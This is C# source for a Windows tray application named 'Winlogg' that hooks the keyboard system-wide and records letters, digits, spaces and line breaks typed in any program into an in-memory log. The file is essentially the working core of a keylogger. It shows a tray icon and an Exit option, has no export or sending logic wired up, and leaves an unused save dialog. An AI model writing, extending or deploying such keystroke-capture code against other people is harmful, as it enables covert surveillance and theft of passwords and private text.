using System;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using Winhooks;

namespace Winlogg {
    public class App: SystemTrayApplicationContext {
        
        private const int KEY_0 = 0x30;
        private const int KEY_9 = 0x39;
        private const int KEY_A = 0x41;
        private const int KEY_Z = 0x5A;
        private const int KEY_ENTER = 0x0D;
        private const int KEY_SPACE = 0x20;
        private const int KEY_BACKSPACE = 0x08;

        private StringBuilder Log { get; }
        private IWinHook KbdHook { get; }
        private bool Running { get; set; }
        private FileDialog ExportDialog { get; }
        private bool SkipKeyStrokes { get; set; }
        
        public App(): base("Winlogg") {
            Log = new StringBuilder();
            KbdHook = new KeyboardHook(KeyboardHookHandler);
            ExportDialog = new SaveFileDialog();
            NotifyIcon.Icon = new System.Drawing.Icon(SystemIcons.Exclamation, 30, 30);
            
            ContextMenuStrip.Items.Add("Exit", default, ButtonExitClickHandler);
            
            KbdHook.Hook();
            Running = true;
        }

        private void KeyboardHookHandler(object sender, KeyHookEventArgs args) {
            if(!SkipKeyStrokes) {
                int pressed = (int)args.KeyPressed;

                if(pressed >= KEY_A && pressed <= KEY_Z) Log.Append(args.KeyPressed);
                else if(pressed >= KEY_0 && pressed <= KEY_9) Log.Append((pressed - KEY_0));
                else if(pressed == KEY_ENTER) Log.Append(Environment.NewLine);
                else if(pressed == KEY_SPACE) Log.Append(" ");
                else if(pressed == KEY_BACKSPACE && Log.Length > 0 && Log[Log.Length - 1]!= '\n') Log.Remove(Log.Length - 1, 1);
            }
        }

        private void ButtonExitClickHandler(object sender, EventArgs args) {
            ExitThread();
        }
    }
}